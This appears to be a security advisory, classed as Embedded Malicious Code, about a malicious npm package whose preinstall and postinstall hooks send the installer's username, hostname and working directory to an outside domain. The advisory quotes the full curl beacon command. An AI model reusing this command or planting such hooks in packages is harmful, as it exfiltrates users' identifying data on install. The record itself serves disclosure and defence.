summary: Install-time exfiltration of installer identity via lifecycle curl beacon
details: package.json declares both preinstall and postinstall lifecycle scripts that run curl against a DNS-beacon-style subdomain, transmitting the installer's username, hostname, current working directory, and a timestamp as URL query parameters over plain HTTP: `curl -s "http://da9nu7avbsgtvoua4om0746ibn3suot7h.cyowl.com/autobahn-electron-probe/?u=$(whoami)&h=$(hostname)&d=$PWD&t=$(date +%s)"`. The scripts fire automatically on `npm install`. The remaining shipped content is an inert placeholder; the manifest lifecycle hooks are the entire payload. The destination subdomain is unrelated to any legitimate publisher and follows a DNS-exfiltration beacon pattern.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
